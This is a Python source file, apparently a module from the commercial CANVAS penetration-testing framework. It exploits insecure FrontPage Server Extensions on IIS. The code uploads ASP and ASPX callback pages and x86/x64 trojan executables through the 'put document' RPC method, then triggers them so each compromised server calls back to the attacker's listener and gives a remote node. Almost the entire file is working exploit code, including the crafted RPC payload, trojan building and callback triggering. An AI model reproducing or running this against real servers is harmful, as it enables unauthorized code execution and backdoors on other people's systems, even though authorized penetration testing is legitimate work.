# -*- coding: utf-8 -*-
#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2011
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if "." not in sys.path: sys.path.append(".")

import os
import base64
import urllib
import urllib2
import time
import exploitutils
import canvasengine
import shutil
import threading
import zipfile
import re
from libs import spkproxy
from tcpexploit import tcpexploit
from libs.canvasos import *
from Queue import Queue
from exploitutils import *

NAME                                        = "frontpage_rpc_fileupload"
DESCRIPTION                                 = "FrontPage Server Extension RPC File Upload"
VERSION                                     = "1.0"
NOTES                                       = """Notes"""
GTK2_DIALOG                                 = "dialog.glade2"
DOCUMENTATION                               = {}
DOCUMENTATION["Notes"]                      = """
FrontPage Server Extensions provide RPC methods that can be used to perform different tasks.
If these extensions are present and not correctly secured a user could simply
call the 'put document' method to upload files.
This modules uploads ASPX and ASP files that trigger a callback in order to provide a CANVAS node.
The module works with old FronPage Server Extensions version. Tested on IIS 5 with FSE version 2000.

FSE are also found on Sharepoint instances, but uploaded files are not stored in the filesystem,
a content database is used instead. When accessing them, they are processed with the SafeMode parser
which doesn't allow ASP CodeBehind nor inline ASP code blocks, thus preventing this module
from working properly.
"""

DOCUMENTATION['VENDOR']                     = "Microsoft"
DOCUMENTATION["Repeatability"]              = "Infinite"
DOCUMENTATION["References"]                 = """
http://msdn.microsoft.com/en-us/library/dd587467(v=office.11).aspx
http://msdn.microsoft.com/en-us/library/ms443099.aspx
http://msdn.microsoft.com/en-us/library/dd586281(v=office.11).aspx
"""

PROPERTY                                    = {}
PROPERTY['TYPE']                            = "Tools"
PROPERTY['ARCH']                            = [ ["Windows"] ]
PROPERTY['VERSION']                         = [ "All" ]


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = ''
        self.hostname           = ''
        self.port               = 80
        self.ssl                = False
        self.base_url           = ""
        self.authordll_path     = "/_vti_bin/_vti_aut/author.dll"
        self.authordll_url      = ""
        self.info_path          = "/_vti_inf.html"
        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.tmppath            = None
        self.mosdef_type        = "UNIVERSAL" # | HTTP | DNS
        self.dns_domain         = None
        self.http_ssl           = False
        self.UA                 = None
        self.asp_filename       = exploitutils.randomstring(8) + ".asp"
        self.aspx_filename      = exploitutils.randomstring(8) + ".aspx"
        self.cs_filename        = exploitutils.randomstring(8) + ".cs"
        self.filenames          = []
        self.auth_user          = ""
        self.auth_password      = ""
        self.auth_type          = "BASIC"
        self.trigger_urls       = []
        self.working_trigger_url= ""
        self.fp_version         = "4.0.2.2611" # and old version as default (FP 2002)
        self.success_regex      = re.compile("message=successfully put document [\'\"](.*)[\'\"] as [\'\"](.*)[\'\"]")
        self.fail_regex         = re.compile("status=(\d+).*<li>msg=(.*)<li>", re.DOTALL)
        self.setInfo(DESCRIPTION)

    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        if mosdef_type == "DNS":
            return [canvasengine.DNSMOSDEF]
        elif mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.getarg("host")
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("dns_domain")

        self.ssl           = self.getarg("ssl")
        self.auth_user     = self.argsDict.get("username", self.auth_user)
        self.auth_password = self.argsDict.get("password", self.auth_password)
        self.mosdef_type   = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.auth_type     = self.argsDict.get("auth_type_value", self.auth_type).upper().strip()

    def setup_UA(self, url):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.auth_user and self.auth_password:
            self.log("Using %s auth (User: %s - Password: %s)" % (self.auth_type,
                                                                  self.auth_user,
                                                                  self.auth_password))
            if self.auth_type == "BASIC":
                auth = spkproxy.BasicAuth(self.auth_user, self.auth_password)
            else: #NTLM
                domain = ""
                user = self.auth_user
                if "\\" in self.auth_user:
                    domain, user = self.auth_user.split("\\")
                    print "domain =", domain, " - user=", user
                auth = spkproxy.NTLMAuth(user, self.auth_password, domain)
        else:
            auth = None

        ua  = spkproxy.UserAgent(url, auth=auth, hostname=self.hostname, exploit=self)
        ua.addHeader("X-Vermeer-Content-Type", "application/x-vermeer-urlencoded")
        ua.addHeader("Content-Type", "application/x-vermeer-urlencoded")
        return ua

    def trigger_callback(self):
        """
        This module uploads an ASP & ASPX callbacks
        This trigger tries using ASPX first and ASP in case of failure
        """
        for url in self.trigger_urls:
            self.log("Triggering with URL: " + url)
            res = False
            for i in xrange(0, 5):
                try:
                    self.log("Triggering callback (attempt %d)" % i)
                    response = spkproxy.urlopen(url)
                    content = response.read() # can response be None?
                    if response and "MOSDEF Callback successfully triggered" in content:
                        res = True
                        # little delay waiting for our node so ISuccess returns the right value
                        time.sleep(3)
                        self.working_trigger_url = url
                        return True
                    else:
                        self.log("MOSDEF Callback execution attempt %d failed. Waiting 5 secs." % i)
                        time.sleep(5)
                except Exception:
                    self.log("An error ocurred while trying to trigger MOSDEF Callback. (attempt %d)" % i)
                    time.sleep(5)

        return False

    def upload_callback_files(self):
        """
        Uploads both ASP and ASPX callbacks and MOSDEF trojans
        by using the "put document" method
        """
        for f in self.filenames:
            response = self.do_put_document_request(f)
            if not self.check_upload_response(response):
                return False

        return True

    def do_put_document_request(self, filename, directory=""):
        self.log("[+] Uploading %s" % filename)
        try:
            data = self.make_put_document_payload(filename, directory)
            ua = self.setup_UA(self.authordll_url)
            response = ua.POST("", data)
        except Exception, e:
            # if response code is 500 here, it may have executed the service anyway...
            response = ""
        return response


    def check_upload_response(self, content):
        # After a successful upload the response should contian something like:
        # message=successfully put document 'filename' as 'xxxxxx'
        m = self.success_regex.search(content)
        if m is not None:
            filename, remote_path = m.groups()
            self.log("[+] Succesfully uploaded file %s uploaded as %s" % m.groups())
            return True
        else:
            # If it failed, we'll find some status code and a msg:
            # status=589829
            # msg=some reason here...
            self.log("[-] Failed to upload file")
            m = self.fail_regex.search(content)
            if m is not None:
                errcode, msg = m.groups()
                self.log("[-] %s (error code: %s)" % (msg.strip(), errcode))
            return False


    def make_put_document_payload(self, filename, directory="", service_name=""):
        # service_name would be the name of the "subsite" in the sharepoint
        data = "method=put+document%3a%[fp_version]&service%5fname=[service_name]&document=%5bdocument%5fname%3d[document_name]%3bmeta%5finfo%3d%5b%5d%5d&put%5foption=overwrite&comment=&keep%5fchecked%5fout=false\n"
        data = data.replace("[fp_version]", self.fp_version)
        data = data.replace("[document_name]", "/".join([directory.strip("/"), filename]))
        data = data.replace("[service_name]", service_name) #XXX: just in case we need it in the future
        f = open(os.path.join(self.tmppath, filename))
        contents = f.read()
        f.close()
        data = data + contents
        return data

    def get_frontpage_version(self):
        """
        If possible the version is retrieved by parsing data from /_vti_inf.html
        Also headers may give some info on "MicrosoftSharePointTeamServices"
        """
        ua = self.setup_UA(self.base_url + "/_vti_inf.html")
        response = ua.GET("")
        p = re.compile(r'FPVersion="([\d\.]+)"')
        m = p.search(response)
        if m is not None:
            self.fp_version = m.group(1)
            self.log("[+] Found Frontpage Server Extensions version %s" % self.fp_version)
        else:
            self.log("[-] Using default Frontpage Server Extensions version %s" % self.fp_version)


    def check_frontpage_extensions(self):
        """
        We try to find FrontPage Server Extensions on the target.
        Returns False if extensions were not found meaning exploit won't work.
        """

        self.log("Checking for Authoring DLL on URL: %s" % self.authordll_url)
        # self.UA.GET doesn't return the response code, so we use urllib2 here instead for now
        try:
            req = urllib2.Request(self.authordll_url, headers={"X-Vermeer-Content-Type": "application/x-vermeer-urlencoded"})
            response = urllib2.urlopen(req)
            code = response.code
            content = response.read()
        except urllib2.URLError, e:
            code = e.code or -1
            content = ""

        if code == 200:
            #XXX: is this the only way to confirm?..
            if "<title>vermeer RPC packet</title>" in content or "Unknown CONTENT_TYPE:" in content:
                self.log("Authoring DLL was found and no authentication was required")
                return True
            else:
                self.log("Response code is 200, but page contents do not appear to be for a valid FrontPage RPC response")
                return False

        elif code == 401:
            self.log("Authentication is required")
            if self.auth_user and self.auth_password:
                self.log("Credentials provided will be used to authenticate")
                return True
            else:
                self.log("If you have valid credentials, please run the module again with them")
                return False

        elif code == 404:
            self.log("Authoring DLL was not found.")
            return False

        else: # other response codes will just be ignored
            self.log("Response code %d was received when trying to access the URL. Exiting...")
            return False

    def run(self):
        ret = 0
        self.getargs()

        if not self.host: self.host = self.target.interface
        if not self.hostname: self.hostname = self.host
        if not self.dns_domain: self.dns_domain = "%s.%s" % (self.name, self.host)

        # build urls needed for the module
        protocol = "https" if self.ssl else "http"
        self.base_url = "%s://%s:%s" % (protocol, self.hostname, self.port)
        self.authordll_url = "%s%s" % (self.base_url, self.authordll_path)
        self.trigger_urls.append(self.base_url + "/%s" %  self.aspx_filename) #aspx first
        self.trigger_urls.append(self.base_url + "/%s" %  self.asp_filename)
        self.filenames = [self.aspx_filename, self.asp_filename, self.cs_filename, "callback_X86.exe", "callback_X64.exe"]
        # Temp path
        self.tmppath = self.engine.create_new_session_output_dir(self.host, 'temp_files')

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.hostname, self.port))
        self.log("Attacking %s:%d" % (self.hostname, self.port))

        if not self.check_frontpage_extensions():
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            return 0

        self.get_frontpage_version()

        if not self.build_trojans():
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            return 0

        self.create_deployment_files()

        if self.upload_callback_files():
            self.trigger_callback()

        if self.ISucceeded():
            ret = 1
            self.show_trigger_message()
            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
        else:
            ret = 0
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))

        self.clean_temp_resources()
        return ret

    def _prepare_file(self, repls, template_filename, real_filename):
        """
        Creates a copy of the template_filename named as real_name
        and replaces all items inside repls dictionary
        """
        template_file = open(template_filename, "rt")
        template = template_file.read()
        template_file.close()
        real_file = open(real_filename, "wt")
        for r, v in repls.iteritems():
            template = template.replace(r, v)
        real_file.write(template)
        real_file.close()

    def create_deployment_files(self):
        """
        Dinamically creates a mosdef trojan for both x86 & x64.
        It uses templates to create ASP & ASPX callbacks which will execute our trojan.
        Created files are stored in a temp directory.
        """
        # the aspx template needs to be completed by using the right code filename
        repls = { "[CODEFILENAME]" : self.cs_filename }
        self._prepare_file(repls, os.path.join(self.respath, "callback.aspx.template"),
                           os.path.join(self.tmppath, self.aspx_filename))

        # copy the cs template and just rename it to the new random name
        shutil.copy(os.path.join(self.respath, "callback.aspx.cs.template"),
                    os.path.join(self.tmppath, self.cs_filename))

        # copy the callback.asp.template and just rename it to the new random name
        shutil.copy(os.path.join(self.respath, "callback.asp.template"),
                    os.path.join(self.tmppath, self.asp_filename))

    def clean_temp_resources(self):
        """
        Cleanup any local temp file created during exploit execution.
        """
        self.log("Cleaning local temp files...")
        delete_files = []
        for f in self.filenames:
            delete_files.append(os.path.join(self.tmppath, f))

        for f in delete_files:
            try:
                os.remove(f)
            except Exception:
                pass

    def build_trojans(self):
        """
        Builds MOSDEF trojans (x86 & x64) according to the selected mosdef type.
        """
        msg = "Building MOSDEF trojans (type: %s - Callback ip: %s)" % (self.mosdef_type, str(self.callback.ip))
        #msg += " - SSL = %s)" % str(self.http_ssl) if self.mosdef_type == "HTTP" else ")"
        self.log(msg)
        if self.mosdef_type == "UNIVERSAL":
            return self.build_universal_trojans()
        elif self.mosdef_type == "HTTP":
            return self.build_universal_trojans(http=True, ssl=self.http_ssl)
        else:
            return self.build_dns_trojans()

    def build_dns_trojans(self):
        filename = os.path.join(self.tmppath, "callback_X86.exe")
        trojanmod = self.engine.getModuleExploit("BuildDNSCallback")
        trojanmod.link(self)
        trojanmod.argsDict["proxyaddr"] = self.callback.ip
        trojanmod.argsDict["domain"]    = self.dns_domain
        trojanmod.argsDict["filename"]  = filename
        ret = trojanmod.run()
        #XXX: DNS mosdef is still not available for 64bits, so just to make it work
        # for now, we make a copy of the x86 binary to have the x64 callback file
        if ret:
            try:
                shutil.copyfile(filename, filename.replace("X86", "X64"))
            except IOError:
                ret = 0
        return ret

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        self.log("Creating MOSDEF Trojans for ip: %s and port: %s" % (str(self.callback.ip), str(self.callback.port)))
        t_os = canvasos("Windows")
        for arch in ("X86", "X64"):
            t_os.arch = arch
            try:
                ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                             target_os=t_os, universal=True,
                                             http=http, ssl=ssl)
                if ret:
                    filename = os.path.join(self.tmppath, "callback_%s.exe" % arch)
                    with open(filename,"wb") as f:
                        f.write(self.mosdeftrojan)
            except Exception, err:
                self.log("Problem building MOSDEF trojan: %s" % str(err))
                res = False
        return res

    def show_trigger_message(self):
        port = "53" if self.mosdef_type == "DNS" else str(self.callback.port)
        self.log("IMPORTANT: you can get a new node back without running the exploit again by manually starting a %s MOSDEF listener on interface %s and port %s "
                 " and then requesting the following trigger URL: %s" % (self.mosdef_type, str(self.callback.ip), port, self.working_trigger_url))

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
